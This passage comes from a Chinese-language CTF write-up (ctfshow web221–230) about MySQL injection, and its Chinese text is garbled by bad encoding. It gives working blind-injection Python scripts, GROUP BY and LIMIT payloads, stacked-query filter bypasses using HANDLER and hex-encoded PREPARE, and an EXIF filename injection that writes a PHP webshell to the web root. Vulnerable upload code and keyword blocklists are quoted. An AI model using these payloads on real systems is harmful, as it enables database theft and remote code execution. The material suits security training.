ANALYZE</a></p><p><a href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html">Mysqlä¸‹Limitæ³¨å…¥æ–¹æ³•</a></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">&#x2F;api&#x2F;?page&#x3D;1&amp;limit&#x3D;1 procedure analyse(extractvalue(rand(),concat(0x3a,database())),1)</code></pre><p><img src="web221.png" loading="lazy"></p><h4 id="web222-groupæ³¨å…¥"><a href="#web222-groupæ³¨å…¥" class="headerlink" title="web222(groupæ³¨å…¥)"></a>web222(groupæ³¨å…¥)</h4><p>æŸ¥è¯¢è¯­å¥</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//åˆ†é¡µæŸ¥è¯¢</span><span class="token variable">$sql</span> <span class="token operator">=</span> select <span class="token operator">*</span> from ctfshow_user group <span class="token class-name type-declaration">by</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    </code></pre><p><a href="https://www.cnblogs.com/02SWD/p/CTF-sql-group_by.html#1869274163">group byæ³¨å…¥åŸç†</a></p><p>å»¶æ—¶ç›²æ³¨ï¼Œä¾‹å¦‚</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">group by if(1&#x3D;1,sleep(1),1)</code></pre><blockquote><p>ä½†è¦æ³¨æ„çš„æ˜¯ï¼Œgroup byä¼šå‘ä¸‹ä¸€ç›´æŸ¥è¯¢ï¼Œæ•°æ®åº“é‡Œæ€»å…±æœ‰21æ¡æ•°æ®ï¼Œå¦‚æœæˆ‘ä»¬æ˜¯sleep(0.05)åˆ™æ˜¯åœé¡¿1.05ç§’</p></blockquote><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://cfb15639-dd8d-4146-a2c1-5b6e2e349162.challenge.ctf.show/api/"</span>flag <span class="token operator">=</span> <span class="token string">''</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment"># æŸ¥åº“å</span>        <span class="token comment"># payload = "select group_concat(table_schema) from information_schema.schemata"</span>        <span class="token comment"># æŸ¥è¡¨å  ctfshow_flaga,ctfshow_user</span>        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment"># æŸ¥åˆ—å  id,flagaabc,info</span>        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flaga'"</span>        <span class="token comment"># getFlag</span>        payload <span class="token operator">=</span> <span class="token string">"select flagaabc from ctfshow_flaga"</span>        params <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"u"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"concat((if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">, sleep(0.05), 2)),1);"</span></span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span>params<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>            tail <span class="token operator">=</span> mid        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span></code></pre><h4 id="web223"><a href="#web223" class="headerlink" title="web223"></a>web223</h4><p>group by ä½ç½®æ³¨å…¥ï¼Œå’Œä¸Šä¸€é¢˜å·®ä¸å¤šï¼Œä¸è¿‡è¿™æ¬¡å†å°è¯•ä¼šå‘ç°ç¦ç”¨äº†æ•°å­—ï¼Œæ”¹ç”¨ true æ„é€ æ•°å­—ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">def</span> <span class="token function">generateNum</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> <span class="token string">'true'</span>    <span class="token keyword">if</span> n <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> res    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            res <span class="token operator">+=</span> <span class="token string">"+true"</span>        <span class="token keyword">return</span> resurl <span class="token operator">=</span> <span class="token string">"https://9fb07532-bf0d-4e1c-b4aa-241e19c88933.challenge.ctf.show/api/"</span>flag <span class="token operator">=</span> <span class="token string">''</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment"># æŸ¥åº“å</span>        <span class="token comment"># payload = "select group_concat(table_schema) from information_schema.schemata"</span>        <span class="token comment"># æŸ¥è¡¨å  ctfshow_flagas,ctfshow_user</span>        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment"># æŸ¥åˆ—å  id,flagasabc,info</span>        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagas'"</span>        <span class="token comment"># getFlag</span>        payload <span class="token operator">=</span> <span class="token string">"select flagasabc from ctfshow_flagas"</span>        params <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"u"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"(if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>generateNum<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>generateNum<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>generateNum<span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">, username, 'a'))"</span></span>        <span class="token punctuation">&#125;</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span>params<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"userAUTO"</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            tail <span class="token operator">=</span> mid    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span></code></pre><h4 id="web224-æ–‡ä»¶åæ³¨å…¥"><a href="#web224-æ–‡ä»¶åæ³¨å…¥" class="headerlink" title="web224(æ–‡ä»¶åæ³¨å…¥)"></a>web224(æ–‡ä»¶åæ³¨å…¥)</h4><p>æŸ¥çœ‹&#x2F;robots.txtï¼Œå‘ç°&#x2F;pwdreset.phpï¼Œè¿›å»åå¯ä»¥é‡ç½®adminå¯†ç ï¼Œç„¶åæ˜¯è¿›è¡Œæ–‡ä»¶ä¸Šä¼ ï¼Œä½†æ˜¯ä¸Šä¼ ä»€ä¹ˆæ–‡ä»¶éƒ½æ˜¯ç±»å‹é”™è¯¯</p><p>æ–‡ä»¶åæ³¨å…¥ï¼Œä¸‹è½½ç¾¤é‡Œçš„<code>payload.bin</code>ï¼Œåå…­è¿›åˆ¶çš„æ„æ€æ˜¯</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token string backtick-quoted-string">`$_GET[1]?`</span><span class="token operator">></span></span></code></pre><p>ç„¶åè¿›è¡ŒRceå°±è¡Œ</p><p><img src="web224.png" loading="lazy"></p><p><strong>upload.php</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Return Code: "</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br />"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"size"</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token number">10</span><span class="token operator">*</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"æ–‡ä»¶è¿‡å¤§: "</span> <span class="token operator">.</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"size"</span><span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token number">1024</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" Kb&lt;br />"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"upload/"</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>      <span class="token keyword">echo</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" already exists. "</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span>      <span class="token punctuation">&#123;</span>  <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">".zip"</span><span class="token punctuation">;</span>      <span class="token variable">$filetype</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">finfo</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/image|png|bmap|jpg|jpeg|application|text|audio|video/i"</span><span class="token punctuation">,</span><span class="token variable">$filetype</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"file type error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token variable">$filepath</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"upload/"</span><span class="token operator">.</span><span class="token variable">$filename</span><span class="token punctuation">;</span>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"INSERT INTO file(filename,filepath,filetype) VALUES ('"</span><span class="token operator">.</span><span class="token variable">$filename</span><span class="token operator">.</span><span class="token string double-quoted-string">"','"</span><span class="token operator">.</span><span class="token variable">$filepath</span><span class="token operator">.</span><span class="token string double-quoted-string">"','"</span><span class="token operator">.</span><span class="token variable">$filetype</span><span class="token operator">.</span><span class="token string double-quoted-string">"');"</span><span class="token punctuation">;</span>      <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token string double-quoted-string">"upload/"</span> <span class="token operator">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$con</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"ctf"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Could not connect: '</span> <span class="token operator">.</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysqli_multi_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:filelist.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"Error: "</span> <span class="token operator">.</span> <span class="token variable">$sql</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br>"</span> <span class="token operator">.</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token delimiter important">?></span></span></code></pre><p>æŸ¥è¯¢è¯­å¥ï¼š</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">$sql &#x3D; &quot;INSERT INTO file(filename,filepath,filetype) VALUES (&#39;&quot;.$filename.&quot;&#39;,&#39;&quot;.$filepath.&quot;&#39;,&#39;&quot;.$filetype.&quot;&#39;);&quot;;</code></pre><p><img src="https://img-blog.csdnimg.cn/2020050915132686.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"><br>ä¸€èˆ¬å†™æˆ16è¿›åˆ¶å½¢å¼ï¼Œé¿å…è¯­å¥æœ¬èº«çš„å•å¼•å·åŒå¼•å·å¯¹æ‹¼æ¥é€ æˆå¹²æ‰°</p><p><img src="https://img-blog.csdnimg.cn/20200509151345661.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"><br>æœ¬åœ°æµ‹è¯•å‘ç°ï¼Œå†™è¿›å»çš„16è¿›åˆ¶ä¼šè‡ªåŠ¨è¢«è®¡ç®—æœºè¯†åˆ«å‡ºASCII</p><p>ç”¨åˆ°exiftoolå·¥å…·æŠŠè¿™ä¸ªè¯­å¥å†™åˆ°å›¾ç‰‡å±æ€§é‡Œé¢  è¯­æ³•ï¼š</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">exiftool -overwrite_original -comment&#x3D;&quot;y1ng\&quot;&#39;);select 0x3C3F3D60245F504F53545B305D603B into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php&#39;;--+&quot;</code></pre><h4 id="web225-å †å plus-handler"><a href="#web225-å †å plus-handler" class="headerlink" title="web225(å †å plus handler)"></a>web225(å †å plus handler)</h4><p>æŸ¥è¯¢è¯­å¥</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//åˆ†é¡µæŸ¥è¯¢</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select id,username,pass from ctfshow_user where username = '<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$username</span><span class="token punctuation">&#125;</span></span>';"</span><span class="token punctuation">;</span>    </code></pre><p>è¿”å›é€»è¾‘</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//å¸ˆå‚…è¯´è¿‡æ»¤çš„è¶Šå¤šè¶Šå¥½</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/file|into|dump|union|select|update|delete|alter|drop|create|describe|set/i'</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    </code></pre><p><strong>handler</strong></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">?username&#x3D;ctfshow&#39;;show tables;?username&#x3D;ctfshow&#39;;handler &#96;ctfshow_flagasa&#96; open;handler &#96;ctfshow_flagasa&#96; read first;</code></pre><p><strong>é¢„å¤„ç†</strong></p><p>åˆ©ç”¨concatç»•è¿‡ä¸€åˆ‡è¿‡æ»¤ï¼Œä¹‹åå°±æ˜¯æ›¿æ¢åé¢çš„database()ä¸ºæƒ³è¦æ‰§è¡Œçš„è¯­å¥å³å¯ï¼Œåˆ«å¿˜äº†åŠ ç©ºæ ¼</p><p>å¯¹äºä¸çŸ¥é“å•¥æ˜¯é¢„å¤„ç†ï¼š<a href="https://blog.csdn.net/solitudi/article/details/107823398?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160652999219721940215459%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=160652999219721940215459&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_blog_default-1-107823398.pc_v2_rank_blog_default&utm_term=%E5%BC%BA%E7%BD%91%E6%9D%AF&spm=1018.2118.3001.4450">SQlæ³¨å…¥å¼ºç½‘æ¯ 2019</a></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">username&#x3D;user1&#39;;PREPARE y4tacker from concat(&#39;s&#39;,&#39;elect&#39;, &#39; database()&#39;);EXECUTE y4tacker;</code></pre><p>å½“ç„¶<code>concat(char(115,101,108,101,99,116)</code>ä¹Ÿå¯ä»¥ä»£æ›¿<code>select</code></p><p><strong>show</strong> å±•ç¤ºä¸€ä¸‹è¡¨ååˆ—å</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">&#39;;show tables;#&#39;;show columns from &#96;ctfshow_flagasa&#96;;#</code></pre><h4 id="web226"><a href="#web226" class="headerlink" title="web226"></a>web226</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//å¸ˆå‚…è¯´è¿‡æ»¤çš„è¶Šå¤šè¶Šå¥½</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/file|into|dump|union|select|update|delete|alter|drop|create|describe|set|show|\(/i'</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>   </code></pre><p>banäº†<code>show</code>å’Œ<code>(</code>ï¼Œå¯ä»¥ä½¿ç”¨16è¿›åˆ¶ç»•è¿‡</p><p><img src="web226.png" loading="lazy"></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">?username&#x3D;user1&#39;;PREPARE hsad from 0x73656c6563742067726f75705f636f6e636174287461626c655f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573207768657265207461626c655f736368656d613d64617461626173652829;EXECUTE hsad;</code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">select flagasb from ctfsh_ow_flagas?username&#x3D;user1&#39;;PREPARE hsad from 0x73656c65637420666c61676173622066726f6d2063746673685f6f775f666c61676173;EXECUTE hsad;</code></pre><h4 id="web227-information-schema-Routines"><a href="#web227-information-schema-Routines" class="headerlink" title="web227(information_schema.Routines)"></a>web227(information_schema.Routines)</h4><p>è¿™é“é¢˜ï¼Œä½ å°±ç®—æ‰¾éæ‰€æœ‰åœ°æ–¹åŸºæœ¬ä¸Šéƒ½æ‰¾ä¸åˆ°flagè¡¨<br>å…ˆç»™å‡ºå…¶ä¸­ä¸€ä¸ª<code>payload1&#39;;call getFlag();</code>è™½ç„¶èƒ½å¾—åˆ°ç­”æ¡ˆä½†æ˜¯æ„ä¹‰ä¸å¤§<br>è¿™é“é¢˜è€ƒç‚¹å…¶å®æ˜¯æŸ¥çœ‹MySQLçš„å­˜å‚¨è¿‡ç¨‹<br><a href="https://blog.csdn.net/qq_41573234/article/details/80411079">MySQLâ€”â€”æŸ¥çœ‹å­˜å‚¨è¿‡ç¨‹å’Œå‡½æ•°</a></p><p><strong>æŸ¥çœ‹å­˜å‚¨è¿‡ç¨‹å’Œå‡½æ•°çš„ä¿¡æ¯</strong><br>åœ¨  MySQL ä¸­ï¼Œå­˜å‚¨è¿‡ç¨‹å’Œå‡½æ•°çš„ä¿¡æ¯å­˜å‚¨åœ¨<code>information_schema</code>æ•°æ®åº“ä¸‹çš„<code>Routines</code>è¡¨ä¸­ï¼Œå¯ä»¥é€šè¿‡æŸ¥è¯¢è¯¥è¡¨çš„è®°å½•æ¥æŸ¥è¯¢å­˜å‚¨</p><p>è¿‡ç¨‹å’Œå‡½æ•°çš„ä¿¡æ¯ï¼Œå…¶åŸºæœ¬çš„è¯­æ³•å½¢å¼å¦‚ä¸‹:</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT * FROM information_schema.RoutinesWHERE ROUTINE_NAME&#x3D;&#39; sp_name&#39;;</code></pre><p>å…¶ä¸­ï¼ŒROUTINE_NAME  å­—æ®µä¸­å­˜å‚¨çš„æ˜¯å­˜å‚¨è¿‡ç¨‹å’Œå‡½æ•°çš„åç§°;   sp_name  å‚æ•°è¡¨ç¤ºå­˜å‚¨è¿‡ç¨‹æˆ–å‡½æ•°çš„åç§°ã€‚</p><p>æˆ‘ä»¬å»æŸ¥<code>information_schema.routines</code>è¡¨</p><p><img src="web227.png" loading="lazy"></p><p>å¯ä»¥çœ‹åˆ°getFlagå‡½æ•°ï¼Œå½“ç„¶flagç›´æ¥å°±æœ‰</p><h4 id="web228"><a href="#web228" class="headerlink" title="web228"></a>web228</h4><p>æŸ¥è¯¢è¯­å¥</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//åˆ†é¡µæŸ¥è¯¢</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select id,username,pass from ctfshow_user where username = '<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$username</span><span class="token punctuation">&#125;</span></span>';"</span><span class="token punctuation">;</span><span class="token variable">$bansql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select char from banlist;"</span><span class="token punctuation">;</span>    </code></pre><p>è¿”å›é€»è¾‘</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//å¸ˆå‚…è¯´å†…å®¹å¤ªå¤šï¼Œå°±å†™å…¥æ•°æ®åº“ä¿å­˜</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$banlist</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$banlist</span> <span class="token keyword">as</span> <span class="token variable">$char</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token variable">$char</span><span class="token operator">.</span><span class="token string double-quoted-string">"/i"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>    </code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">select flagasba from ctfsh_ow_flagasaa?username&#x3D;user1&#39;;PREPARE hsad from 0x73656c65637420666c6167617362612066726f6d2063746673685f6f775f666c616761736161;EXECUTE hsad;</code></pre><h4 id="web229"><a href="#web229" class="headerlink" title="web229"></a>web229</h4><pre class="language-mysql" data-language="mysql"><code class="language-mysql">select flagasba from flag?username&#x3D;user1&#39;;PREPARE hsad from 0x73656c65637420666c6167617362612066726f6d20666c6167;EXECUTE hsad;</code></pre><h4 id="web230"><a href="#web230" class="headerlink" title="web230"></a>web230</h4><pre class="language-mysql" data-language="mysql"><code class="language-mysql">select flagasbas from flagaabbx?username&#x3D;user1&#39;;PREPARE hsad from 0x73656c65637420666c616761736261732066726f6d20666c61676161626278;EXECUTE hsad;</code></pre><h4 id="web231-updateæ³¨å…¥"><a href="#web231-updateæ³¨å…¥" class="headerlink" 